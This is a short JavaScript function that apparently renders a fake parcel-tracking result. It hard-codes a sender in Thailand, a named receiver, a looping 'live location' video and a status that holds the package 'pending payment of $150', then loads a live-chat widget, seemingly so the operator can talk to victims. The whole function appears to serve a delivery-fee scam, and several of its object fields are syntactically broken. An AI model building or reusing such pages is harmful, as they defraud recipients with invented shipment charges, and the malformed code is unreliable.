function handle57655556LXVN(resultElement) {
    let result = {
        sender: 'phong chang
        country: 'thailand',
        receiver: María Fernanda Ortiz
        date: 'Aug 13, 2025',
        location: 'Out for Delivery - Out for Delivery - Area. Within 24 hours package would get to destined country - pending payment of $150'
    };

    // Display the result
    resultElement.innerHTML = `
        <p>SENDER NAME: ${result.sender}</p>
        <p>SENDER ADDRESS: ${result.country}</p>
        <p>RECIEVERS NAME : ${result.receiver}</p>
        <p>DATE: ${result.date}</p>
        <p><video id="local" 
        src="live.mp4" autoplay muted loop></video>           Live Location: ${result.location}</p>`;

    // Inject the LiveChat script
    const livechatScript = document.createElement('script');
    livechatScript.src = "//code.tidio.co/beqno6qogvzvp3rdcop7yynzntflrwgi.js";
    livechatScript.async = true;
    document.body.appendChild(livechatScript);
}
